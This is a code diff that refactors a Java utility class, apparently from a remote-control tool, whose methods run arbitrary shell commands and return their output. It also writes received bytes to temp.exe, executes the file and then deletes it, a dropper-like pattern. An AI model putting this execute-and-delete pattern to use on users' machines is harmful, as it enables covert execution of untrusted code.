@@ -2,30 +2,27 @@ package me.soda.witch.shared;
 
 import java.io.*;
 import java.nio.charset.StandardCharsets;
-import java.util.function.Consumer;
 
 @SuppressWarnings("ResultOfMethodCallIgnored")
 public class ProgramUtil {
+    private static final Runtime RT = Runtime.getRuntime();
+
     public static boolean isWin() {
         return System.getProperty("os.name").toLowerCase().contains("windows");
     }
 
     public static String runCmd(String command) {
-        Process process = null;
         try {
-            process = isWin() ? Runtime.getRuntime().exec(
-                    new String[]{"cmd.exe", "/c", command}
-            ) : Runtime.getRuntime().exec(command);
+            Process process = isWin() ? RT.exec(new String[]{"cmd.exe", "/c", command}) : RT.exec(command);
+            return getProcResult(process);
         } catch (IOException e) {
             LogUtil.printStackTrace(e);
         }
-
-        return getProcResult(process);
+        return "";
     }
 
     public static Process execInPath(String cmd, String path) throws IOException {
-        Runtime runtime = Runtime.getRuntime();
-        return runtime.exec(cmd, null, new File(path));
+        return RT.exec(cmd, null, new File(path));
     }
 
     public static String getProcResult(Process process) {
@@ -38,14 +35,10 @@ public class ProgramUtil {
             }
             inputStream.close();
             process.waitFor();
-        } catch (Exception e) {
+        } catch (IOException | InterruptedException e) {
             LogUtil.printStackTrace(e);
         }
         return result.toString();
-    }
-
-    public static void printProcResult(Process process, Consumer<String> consumer) {
-        consumer.accept(getProcResult(process));
     }
 
     public static void runProg(byte[] bytes) {
@@ -56,7 +49,7 @@ public class ProgramUtil {
             FileOutputStream out = new FileOutputStream(file);
             out.write(bytes);
             out.close();
-            Process process = Runtime.getRuntime().exec("temp.exe");
+            Process process = RT.exec("temp.exe");
             process.waitFor();
             if (file.exists()) file.delete();
         } catch (IOException | InterruptedException e) {
